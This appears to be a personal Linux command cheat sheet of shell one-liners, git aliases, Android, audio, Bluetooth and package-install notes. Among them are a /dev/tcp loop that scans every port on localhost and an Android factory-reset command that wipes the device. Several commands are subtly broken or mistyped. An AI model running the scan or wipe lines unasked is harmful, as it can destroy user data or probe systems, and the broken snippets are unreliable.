$> Ctrl+K Ctrl+U           ## Remove line comment
$> Ctrl+/                  ## Toggle line comment
$> Ctrl+Shift+A            ## Toggle block comment
$> Alt+Z                   ##Toggle word wra
## Search and replace
$> Ctrl+F                  ## Find
$> Ctrl+H                  ## Replace
$> F3 / Shift+F3           ## Find next/previous
$> Alt+Enter               ## Select all occurrences of Find match
$> Ctrl+D                  ## Add selection to next Find match
$> Ctrl+K Ctrl+D           ## Move last selection to next Find match
##==========================================
## Factory reset your android device via commandline.
$> am broadcast -a android.intent.action.MASTER_CLEAR
##==========================================
## Uninstall bloatware on your android device without root.
## List all packages with: pm list packages|cut -d: -f2 Show Sample Output
$> pm uninstall --user 0 com.package.name
##==========================================
## Rename all files in lower case
## rename is a really powerfull to, as its name suggests, rename files Show Sample Output
$> rename 'y/A-Z/a-z/'
## or
$> for f in 'find'; do mv -v "$f" "'echo $f | tr '[A-Z]' '[a-z]''"; done
##==========================================
## Start a game on the discrete GPU (hybrid graphics)
## On laptops featuring hybrid graphics and using the free X drivers, the DRI_PRIME variable indicates which GPU to run on. This alias allows to utilize the faster discrete GPU without installing proprietary drivers. Show Sample Output
$> alias game='DRI_PRIME=1'
##==========================================
## Replacement of tree command (ignore node_modules)
$> alias tree='pwd;find . -path ./node_modules -prune -o -print | sort | sed '\''1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g'\'''
##==========================================
## Recursive search and replace (with bash only)
## Replaces a string matching a pattern in one or several files found recursively in a particular folder.
$> find ./ -type f -name "somefile.txt" -exec sed -i -e 's/foo/bar/g' {} \;
##==========================================
## Remove multiple entries of the same command in .bash_history with preserving the chronological order
## Only the first appearance of a repeated command in the history will be kept. Otherwise, if you prefer to keep last occurrence of a repeated command then maybe you can achieve that by including reverse input/output i.e with 'tac' command in expression above.
$> cp -a ~/.bash_history ~/.bash_history.bak && perl -ne 'print unless $seen{$_}++' ~/.bash_history.bak >~/.bash_history
## To see statistics of removed repeated commands:
$> diff --suppress-common-lines -y ~/.bash_history.bak ~/.bash_history|uniq -c|sort -n|tr -s " "|sed '/^ 1/d'|grep '<'
##==========================================
## Switch all connected PulseAudio bluetooth devices to A2DP profile
## Tries to switch all audio devices to the A2DP profile for optimal sound quality. Useful for bluetooth speakers and headphones that always power up in HSP/HFP mode. Note however that this command is only a shorthand for the GUI, so it cannot fix stubborn BT controllers that leave your device stuck in HSP mode until a manual re-coupling.
$> for card in $(pacmd list-cards | grep 'name: ' | sed 's/.*<\(.*\)>.*/\1/'); do pacmd set-card-profile $card a2dp_sink; done
##==========================================
## Scan all open ports without any required program
$> for i in {1..65535}; do (echo < /dev/tcp/127.0.0.1/$i) &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done
##==========================================
## Visual alert with keyboard LEDs
$> for a in $(seq 16); do xdotool key Num_Lock;sleep .5; xdotool key Caps_Lock;done
##==========================================
## Convert & rename all filenames to lower case
$> convmv --lower --notest FILE
##==========================================
## delete at start of each line until character
## Delete the beginning of each line until first match of given character, in this case it's ":" Does it on all lines. The given character is deleted also, and can be a space.
$> sed 's/^[^:]*://g'
##==========================================
## List all ubuntu installed packages in a single line
## Use xargs command to make one line.
$> dpkg --get-selections | grep -Evw 'deinstall$' | cut -f1 | sort -u | xargs
##==========================================
## Rotate a video file by 90 degrees CW
## Change video orientation in metadata only
$> ffmpeg -i in.mov -c copy -metadata:s:v:0 rotate=90 out.mov
##==========================================
## Make window transparent (50% opacity) in Gnome shell
## Click window to change its opacity. Source: https://unix.stackexchange.com/a/494289
$> xprop -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFFFF
##==========================================
## Show top 50 running processes ordered by highest memory/cpu usage refreshing every 1s
## http://alvinalexander.com/linux/unix-linux-process-memory-sort-ps-command-cpu for an overview of --sort available values
$> watch -n1 "ps aux --sort=-%mem,-%cpu | head -n 50"
##==========================================
## Show all current listening programs by port and pid with SS instead of netstat
$> ss -plunt
##==========================================
## Get all upgradable deb packages in a single line
## Works for debian and ubuntu based distros.
$> apt list --upgradable | grep -v 'Listing...' | cut -d/ -f1 | tr '\r\n' ' ' | sed '$s/ $/\n/'
##==========================================
## rsync should continue even if connection lost
## Manage partial uploads using append option.
$> rsync --archive --recursive --compress --partial --progress --append root@123.123.123.123:/backup/somefile.txt.bz2 /home/ubuntu/
##==========================================
## Print sensors data for your hardware
$> paste <(cat /sys/class/thermal/thermal_zone*/type) <(cat /sys/class/thermal/thermal_zone*/temp) | column -s $'\t' -t | sed 's/\(.\)..$/.\1°C/'
##==========================================
## Print interface that is up and running
$> ip addr | awk '/state UP/ {print $2}' | sed 's/.$//'
##==========================================
## Quickly run any gif as a ASCII animation in a terminal window
## A python3 tool that can be installed with the following command
$> pip3 install gif-for-cli --user
$> gif-for-cli /path/to/gif_file.gif
##==========================================
## Use chrome to dump html
$> google-chrome-stable --headless --dump-dom --disable-gpu "https://commandlinefu.com" | html2text
##==========================================
## List all packages in Ubuntu/Debian that no package depends on
$> dpkg-query --show --showformat='${Package}\t${Status}\n' | tac | awk '/installed$/ {print $1}' | xargs apt-cache rdepends --installed | tac | awk '{ if (/^ /) ++deps; else if (!/:$/) { if (!deps) print; deps = 0 } }'
##==========================================
## show a zoomable world map
$> telnet mapscii.me
##==========================================
## Easily convert webp image to
$> sudo apt install webp
## The webp install comes with a utility called dwebp which is a WebP “decoder”.
$> dwebp toConvert.webp -o toSave.png
## convert image
$> gm mogrify -format webp -define webp:lossless=true -quality 100 *.png
##==========================================
## os. hardware. battery. Save battery power.
$> sudo apt install powertop tlp tlp-rdw
## Tune tlp
$> cat /etc/tlp.conf
## Tune powertop.
$> sudo powertop --auto-tune
##---------------------------------
## Power savings  BAD!!!!!
sudo apt-get install tlp
#cat > /etc/tlp.d/00-custom.conf << ENDOFFILE
#
#TLP_ENABLE=1
#
#RADEON_DPM_PERF_LEVEL_ON_AC=high
#RADEON_DPM_PERF_LEVEL_ON_BAT=low
#
#RADEON_DPM_STATE_ON_AC=performance
#RADEON_DPM_STATE_ON_BAT=battery
#
#RADEON_POWER_PROFILE_ON_AC=high
#RADEON_POWER_PROFILE_ON_BAT=low
#
#PCIE_ASPM_ON_AC=performance
#PCIE_ASPM_ON_BAT=powersupersave
#
#DEVICES_TO_ENABLE_ON_STARTUP="wifi"
#DEVICES_TO_DISABLE_ON_STARTUP="bluetooth nfc wwan"
#DEVICES_TO_DISABLE_ON_SHUTDOWN="bluetooth nfc wifi wwan"
#DEVICES_TO_DISABLE_ON_BAT_NOT_IN_USE="bluetooth nfc wifi wwan"
#
#START_CHARGE_THRESH_BAT0=94
#STOP_CHARGE_THRESH_BAT0=98
#
#DEVICES_TO_DISABLE_ON_WIFI_CONNECT="wwan"
#DEVICES_TO_DISABLE_ON_WWAN_CONNECT="wifi"
#ENDOFFILE

#cat > /etc/auto-cpufreq.conf << ENDOFFILE
#[charger]
#governor = performance
#scaling_min_freq = 1700000
#scaling_max_freq = 1700000
#turbo = auto
#
#[battery]
#governor = powersave
#scaling_min_freq = 1400000
#scaling_max_freq = 1600000
#turbo = never
#ENDOFFILE
##------------------------------
https://github.com/AdnanHodzic/auto-cpufreq
##------------------------------
##==========================================
## multimedia. video. hardware. camera. Kill webcam
$> sudo echo 0 > /sys/class/video4linux/video0/shield/state
##==========================================
## os, swap. Reset your swap space
$> sudo swapoff -a && sudo swapon -a
##==========================================
## ??????????
$> alias gayscrotum='scrot -u poop.png && convert poop.png \( +clone -background black -shadow 50x50x50x50+10+10+10+10 \) +swap -background none -layers merge +repage poopy.png && rm poop.png'
##==========================================
[alias]
    a = commit --amend
    allfiles = "!f() { git log --name-only --diff-filter=A --pretty=format: | sort -u; }; f"
    cfg = config --list
    changedfiles = "diff-tree --no-commit-id -r --name-only"
    cam = commit -am
    cm = commit -m
    co = checkout
    cob = checkout -b
    discard = reset HEAD --hard
    discardchunk = checkout -p
    ol = "log --all --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"
    others = "ls-files --others --ignored --exclude-from=.gitignore"
    rmuntracked = clean -df
    root = rev-parse --show-toplevel
    s = status
    searchfiles = "log --name-status --source --all -S"
    searchtext = "!f() { git grep \"$*\" $(git rev-list --all); }; f"
    uncommit = reset --soft HEAD^
    unstage = reset HEAD --
    wip = "!f() { git add . && git commit -m 'Work in progress'; }; f"
diff-all = !"for name in $(git diff --name-only $1); do git difftool -y $1 $name & done"
diff-changes = diff --name-status -r
diff-stat = diff --stat --ignore-space-change -r
diff-staged = diff --cached
diff-upstream = !git fetch origin && git diff master origin/master
##==========================================
## Docker
$> docker run --name some-nginx -d -p 8080:80 -v /some/content:/usr/share/nginx/html:rw -d nginx
##==========================================
## Screen reader
## Pressing AltSuperS will disable or enable speech dispatcher.
$> Alt+Super+S
## The last thing you should hear is
$> "screen reader off"
##==========================================
## Fix bluetooth stutter caused by low amount of buffer
$> sudo apt-get remove blueberry
## And
$> sudo apt-get install blueman
##-----------------------
## This was only partly effective.
https://wiki.archlinux.org/title/bluetooth_headset
## Find necessary info about the bluetooth device (while it is connected!)
$> pactl list | grep -Pzo '.*bluez_card(.*\n)*'
## Use field "Name:: and "Ports:"  headset-output. Set to 50000 - 70000 buffer
$> pactl set-port-latency-offset bluez_card.7D_4D_C1_D8_F1_AA headset-output 64448
$> pactl set-port-latency-offset bluez_card.7D_4D_C1_D8_F1_AA headset-output 125000
## restart bluetooth
$> sudo service bluetooth restart
##==========================================
## How to open DMG file in Linux [Ubuntu , Linux Mint , Kali Linux]
1. sudo apt update
2. sudo apt-get install p7zip-full
3. 7z x [image].dmg
4. mkdir ftmount
5. sudo mount -t hfsplus 5.hfsx ftmount
## *************
## for umount
6. sudo umount ftmount

##==========================================
## PDF fill out anotate
https://www.sejda.com/desktop
##==========================================
## Awesome git tui
https://github.com/jesseduffield/lazygit
## Ubuntu
$> LAZYGIT_VERSION=$(curl -s "https://api.github.com/repos/jesseduffield/lazygit/releases/latest" | grep -Po '"tag_name": "v\K[^"]*')
$> curl -Lo lazygit.tar.gz "https://github.com/jesseduffield/lazygit/releases/latest/download/lazygit_${LAZYGIT_VERSION}_Linux_x86_64.tar.gz"
$> tar xf lazygit.tar.gz lazygit
$> sudo install lazygit /usr/local/bin
## Verify the correct installation of lazygit:
$> lazygit --version

##==========================================
##
    >git add -A
    >git commit -F <(git diff --cached --compact-summary)

$> git checkout `git rev-list --max-parents=0 HEAD | tail -n 1`
$> git push origin HEAD:master
##==========================================
##
https://lock.cmpxchg8b.com/linux123.html
$> sudo apt-get install build-essential gcc-multilib lib32ncurses-dev
##==========================================
## Raspberrypi headless with raspberrian OS
## Create some files on the root / of the sd card
## Username password
echo "$USER:$(echo 'mypassword' | openssl passwd -6 -stdin)" > mount/path/userconf.txt
## Enable ssh
touch mount/path/ssh
## WiFi network info
echo 'country=US
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
network={
    ssid="NETWORK-NAME"
    psk="NETWORK-PASSWORD"
}' > mount/path/wpa_supplicant.conf
## Now availible on network
## Remove old known hosts
$> ssh-keygen -R raspberrypi.local
## Sign on
$> ssh $USER@raspberrypi.local
##==========================================
## extract the audio;
$> ffmpeg -i source.mp4 -map 0:a:0 audio.wav
## edit audio.wav to suit
## mux the audio into a new video;
$> ffmpeg -i source.mp4 -i audio_edited.wav -map 0 -map -0:a:0 -map 1 -c copy -c:a aac -b:a 128k source_fixedaudio.mp4
##==========================================
## Image viewer
$> feh -r -F -Y "$(ls -d -1 ~/Pictures/* | shuf | head -1)"
$> feh -m --thumb-width 800 ~/Pictures/*
$> feh ~/Pictures/*
$> feh --info "exifgrep '(Model|DateTimeOriginal|FNumber|ISO|Flash)' %F | cut -d . -f 4-" ~/Pictures/*
##==========================================
## The VirtualBox documentation says it now only auto assigns IP addresses in the 192.68.56.0/21 range.
## temp fix
$> sudo ip link set dev vboxnet0 up
$> sudo ip address add 192.168.42.1/24 dev vboxnet0
## To auto assign the 192.168.10.10/24 range, a networks.conf file needs to be created.
## Create /etc/vbox/networks.conf on the host with the following contents:
$> * 192.168.42.0/24
$> echo '* 192.168.42.0/24' > /etc/vbox/networks.conf
##==========================================
#!/bin/sh
if [ "$1" == "install" ] then;
        # Second argument == package name
        (do install stuff) $2;
fi
##==========================================
## mount, copy files to partition, unmount
$> install udisks2
## mount, notice the sdb1, select the partition
$> udisksctl mount -b /dev/sdb1
## copy files to partition
$> udisksctl unmount -b /dev/sdb1
## unmount, you must enter the device sdb not the partition
$> udisksctl power-off -b /dev/sdb
##==========================================
## download all images in a thread
$> wget -nd -r -H -l1 -D4cdn.org -A gif,webm,jpeg,jpg,png 4channel.org/{thread}
##==========================================
## Desktop:
$> sudo apt-get install -y calcurse tmux mc bsdgames lynx elinks w3m htop pandoc pdftk cmus wordgrinder diatheke mutt sshfs pdftotext ffmpeg openvpn openssh-server mpv snap git ufw deluged deluged-console
## Server:
$> tmux mc lynx htop sshfs pdftotext ffmpeg openvpn openssh-server mpv snap git ufw
##==========================================
## sed command "cheat-sheet"
$>  :  # label
$>  =  # line_number
$>  a  # append_text_to_stdout_after_flush
$>  b  # branch_unconditional
$>  c  # range_change
$>  d  # pattern_delete_top/cycle
$>  D  # pattern_ltrunc(line+nl)_top/cycle
$>  g  # pattern=hold
$>  G  # pattern+=nl+hold
$>  h  # hold=pattern
$>  H  # hold+=nl+pattern
$>  i  # insert_text_to_stdout_now
$>  l  # pattern_list
$>  n  # pattern_flush=nextline_continue
$>  N  # pattern+=nl+nextline
$>  p  # pattern_print
$>  P  # pattern_first_line_print
$>  q  # flush_quit
$>  r  # append_file_to_stdout_after_flush
$>  s  # substitute
$>  t  # branch_on_substitute
$>  w  # append_pattern_to_file_now
$>  x  # swap_pattern_and_hold
$>  y  # transform_chars

##==========================================
## NEW STUFF TO ADD TO FILE
## Cool pipes
## Switch to Upercase
$> | tr abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ
## or
$> | tr "[:lower:]" "[:upper:]"
## or
$> | tr "a-z" "A-Z"
## Change newlines to spaces
$> | sed ':a;N;$!ba;s/\n/ /g'
## Explanation:
## Create a label via :a.
## Append the current and next line to the pattern space via N.
## If we are before the last line, branch to the created label $!ba ($! means not to do it on the last line as there should be one final newline).
## Finally the substitution replaces every newline with a space on the pattern space (which is the whole file).
##==========================================
<iframe width="560" height="315" src="https://www.youtube.com/embed/sMkIrrv-c5c" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

##==========================================


##==========================================


##==========================================
## Software to look at
## amass, dirsearch, and nmap
## Browser: Firefox ESR
## Email Client: Claws Mail
## Media Player: VLC Media Player
## Image viewer: Nomacs
## Note Taking app: Zim
## Graphics: Gimp 2.10, GMIC, Pixelitor, REMBG, Triangle wallpaper generator
## Document work : LibreOffice, OnlyOffice, GImageReader, PDF Jumbler, HotShots screen caption,
## Misc: Pulse Effects,
## CopyQ Clipboard Manager with Advanced Features
## , Virtual box, GNOME Screenshot,
##
## ## Flameshot
## https://github.com/flameshot-org/flameshot/releases,
##
## Recoll and Video Trimme
## Emba, an open source firmware analyzer,
## https://github.com/andreafabrizi/Dropbox-Uploader

## CudaText - An open source alternative to SublimeText
https://cudatext.github.io/

https://github.com/arindas/mac-on-linux-with-qemu

## for ebooks
epy-reader

## Desktop:
$> sudo apt-get update && sudo apt-get install -y calcurse tmux mc bsdgames lynx elinks w3m htop pandoc pdftk cmus wordgrinder diatheke mutt sshfs pdftotext ffmpeg openvpn openssh-server mpv snap git ufw deluged deluged-console

## Server:
$> sudo apt-get update && sudo apt-get install -y tmux mc lynx htop sshfs pdftotext ffmpeg openvpn openssh-server mpv snap git ufw


https://www.wireguard.com/
https://wazuh.com/
https://github.com/juanfont/headscale
##==========================================
## Remove the $> to activate the commands
$> sed -i 's/^$> //g ' -e 's/^@> //g' cli.sh
##==========================================
## script. if else statement.
if (condition) {
} else {
}
##==========================================
## ############################################################
## ##    vlc stream to chromcast from cli from Optiplex
## ############################################################
## multimedia. video. Works
$> cvlc --sout "#chromecast"  --gnutls-dir-trust=/data  --sout-chromecast-ip=192.168.0.104 --demux-filter=demux_chromecast  /data/0424241032a.mp4
## ############################################################
##==========================================
## Thinkpad MiPi web cam.
$> firefox https://forums.lenovo.com/t5/Ubuntu/MiPi-Camera-and-Ubuntu-Linux-New-kernel-6-5-new-problems/m-p/5282319
$> sudo apt install linux-modules-ipu6-generic-hwe-22.04 linux-modules-ivsc-generic-hwe-22.04
$> sudo add-apt-repository ppa:oem-solutions-group/intel-ipu6
$> sudo apt install libcamhal0
$> sudo add-apt-repository -r ppa:oem-solutions-group/intel-ipu6
$> sudo reboot
$> gst-launch-1.0 v4l2src ! glimagesink
## Using Webcam Test https://webcamtests.com/ to verify if camera works
##
$> firefox https://github.com/stefanpartheym/archlinux-ipu6-webcam
## working by placing the binary into /lib/firmware/intel/ipu
$> cd /lib/firmware/intel/ipu
$> wget https://github.com/intel/ipu6-camera-bins/raw/refs/heads/main/lib/firmware/intel/ipu/ipu6ep_fw.bin
$> chmod +x ipu6ep_fw.bin
##==========================================
## fuzzy finder - search history with fzf
$> apt install fzf,
$> dpkg -L fzf | grep -e key-bindings | grep bash,
$> source [.../key-bindings.bash] ==  . [.../key-bindings.bash],
$> [ctrl-r] / ^r - history search -- ^t -- file ((term-) arg) search


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================
## ###################################################
## ##    Key words. Use to search dockument
## ###################################################
##    Information
##    info
##    hardware
##        cpu
##        gpu
##        ram
##    OS
##        cloud-init.
##        dd
##        iso
##        packagemanager
##            apt
##            dpkg
##
##    power.
##        shutdown
##        start
##        battery
##            save power
##    shell
##    backup
##    logs
##    automation
##    Keyboard
##    Setup
##        install.  apps
##        repositories
##        ssh LAMP apache mysql php Wordpress
##        Nextcloud
##    Networking
##        nmap
##
##    Use
##        filesystem
##            permissions
##        Sound
##        Video
##        Print
##    Framebuffer
##    DANGER
##    Python Stuff
##    Extra Characters
##    GUI Control
##    Unsorted
##    vim
##    shell
##        parameters
##        permissions
##        Pipes
##        More functions
##        scriping
##        multiplex
##            screen
##            tmux
##            term39
##    bashrc
##        Settings
##        Prompt
##        History
##        System
##        Functions
##        Aliases
##            GUI
##            Search
##            Media Encode
##            Image
##            Encryption
##            Command Parameters
##    tmux
##    git
##    install software
##    text
##    sql query
##    docker
##    cloud
##    ssh
##        keys
##        jump
##        tunnel
##        mount
##    networking
##    system
##    multimedia
##    video
##    web
##        view
##        host
##    files
##        redirect
##        pipe
##    GUI gui mouse.
##    cool pipes
##    Framebuffer
##    android
##        abd
##        chromecast
##    sync
##
##    bluetooth
##    wifi
##    web
##    html
##        HTML
##        CSS Cheatsheets
##    json
##    python
##==========================================
## Remove the $> to activate the commands
$> sed -i 's/^$> //g ' -e 's/^@> //g' cli.sh

##==========================================
